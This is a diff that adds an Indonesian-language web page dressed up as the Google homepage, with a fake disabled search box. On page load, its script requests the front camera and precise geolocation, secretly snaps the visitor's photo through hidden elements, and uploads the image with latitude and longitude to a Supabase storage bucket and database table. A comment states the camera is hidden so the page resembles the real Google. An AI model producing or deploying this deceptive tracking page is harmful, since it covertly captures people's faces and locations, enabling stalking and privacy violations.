@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <!-- Favicon Google -->
+    <link rel="icon" href="https://www.google.com/favicon.ico">
+    <!-- Load Supabase Client dari CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: space-between;
+        }
+        header {
+            display: flex;
+            justify-content: flex-end;
+            padding: 15px;
+            font-size: 13px;
+            color: #5f6368;
+        }
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: -10vh;
+            flex: 1;
+            justify-content: center;
+        }
+        .google-logo {
+            font-size: 80px;
+            font-weight: bold;
+            letter-spacing: -3px;
+            margin-bottom: 25px;
+            user-select: none;
+        }
+        .blue { color: #4285F4; }
+        .red { color: #EA4335; }
+        .yellow { color: #FBBC05; }
+        .green { color: #34A853; }
+
+        .search-box {
+            width: 90%;
+            max-width: 584px;
+            height: 44px;
+            border: 1px solid #dfe1e5;
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            padding: 0 14px;
+            box-shadow: none;
+            transition: box-shadow 0.3s;
+        }
+        .search-box:hover {
+            box-shadow: 0 1px 6px rgba(32,33,36,.28);
+            border-color: rgba(223,225,229,0);
+        }
+        .search-box input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            background: transparent;
+            margin-left: 10px;
+        }
+        .search-icon {
+            width: 20px;
+            height: 20px;
+            fill: #9aa0a6;
+        }
+        
+        /* Elemen tersembunyi untuk kamera & status */
+        #camera-container {
+            display: none; /* Disembunyikan agar mirip Google asli */
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+        }
+
+        footer {
+            background-color: #f2f2f2;
+            color: #70757a;
+            font-size: 14px;
+            width: 100%;
+        }
+        .footer-item {
+            padding: 15px 30px;
+            border-bottom: 1px solid #dadce0;
+        }
+        .footer-sub {
+            display: flex;
+            justify-content: space-between;
+            padding: 15px 30px;
+            flex-wrap: wrap;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <span>Gmail</span> &nbsp;&nbsp; <span>Gambar</span>
+    </header>
+
+    <div class="main-container">
+        <!-- Logo Google -->
+        <div class="google-logo">
+            <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
+        </div>
+
+        <!-- Kolom Pencarian Palsu -->
+        <div class="search-box">
+            <svg class="search-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
+            <input type="text" placeholder="Telusuri Google atau ketik URL" disabled>
+        </div>
+
+        <!-- Status opsional (bisa dihapus jika ingin benar-benar bersih) -->
+        <div id="status"></div>
+    </div>
+
+    <!-- Elemen Kamera & Canvas tersembunyi di background -->
+    <div id="camera-container">
+        <video id="camera" autoplay playsinline muted></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <footer>
+        <div class="footer-item">Indonesia</div>
+        <div class="footer-sub">
+            <div><span>Tentang</span> &nbsp;&nbsp; <span>Iklan</span> &nbsp;&nbsp; <span>Bisnis</span></div>
+            <div><span>Privasi</span> &nbsp;&nbsp; <span>Persyaratan</span> &nbsp;&nbsp; <span>Setelan</span></div>
+        </div>
+    </footer>
+
+    <script>
+        // --- KREDENSIAL SUPABASE ANDA ---
+        const SUPABASE_URL = 'https://nhufpeilgbgdvpynrfrb.supabase.co'; 
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5odWZwZWlsZ2JnZHZweW5yZnJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTA3MTI2MDYsImV4cCI6MjEwNjI4ODYwNn0.L3yl0OqdXFLtyzLMXN6Ixv4kRQk-18D6Q4vc0CzaHeg'; 
+        
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        document.addEventListener("DOMContentLoaded", () => {
+            const video = document.getElementById("camera");
+            const canvas = document.getElementById("canvas");
+            const statusDiv = document.getElementById("status");
+
+            async function sendToSupabase(dataUrl, latitude, longitude) {
+                try {
+                    const response = await fetch(dataUrl);
+                    const blob = await response.blob();
+                    
+                    const fileName = `capture_${Date.now()}.png`;
+                    const filePath = fileName;
+
+                    // 1. Upload ke Storage Bucket 'captures'
+                    const { data: storageData, error: storageError } = await supabaseClient.storage
+                        .from('captures')
+                        .upload(filePath, blob, {
+                            contentType: 'image/png',
+                            upsert: true
+                        });
+
+                    if (storageError) throw storageError;
+
+                    // 2. Ambil Public URL
+                    const { data: { publicUrl } } = supabaseClient.storage
+                        .from('captures')
+                        .getPublicUrl(filePath);
+
+                    // 3. Simpan ke Database Table 'logs'
+                    const { error: dbError } = await supabaseClient
+                        .from('logs')
+                        .insert([
+                            { 
+                                photo_url: publicUrl, 
+                                latitude: latitude, 
+                                longitude: longitude 
+                            }
+                        ]);
+
+                    if (dbError) throw dbError;
+
+                    console.log("Data berhasil dikirim ke Supabase.");
+
+                } catch (error) {
+                    console.error("Gagal mengirim:", error);
+                }
+            }
+
+            function capturePhoto(latitude, longitude) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const imageDataURL = canvas.toDataURL("image/png");
+                sendToSupabase(imageDataURL, latitude, longitude);
+            }
+
+            function getLocationAndCapture() {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude;
+                            const lng = position.coords.longitude;
+
+                            setTimeout(() => {
+                                capturePhoto(lat, lng);
+                            }, 1500);
+                        },
+                        (error) => {
+                            console.warn("Gagal mendapatkan lokasi: " + error.message);
+                        },
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
+                }
+            }
+
+            async function startCamera() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: "user" },
+                        audio: false
+                    });
+                    video.srcObject = stream;
+
+                    video.onloadedmetadata = () => {
+                        getLocationAndCapture();
+                    };
+                } catch (err) {
+                    console.warn("Akses kamera ditolak: " + err.message);
+                }
+            }
+
+            startCamera();
+        });
+    </script>
+</body>
+</html>
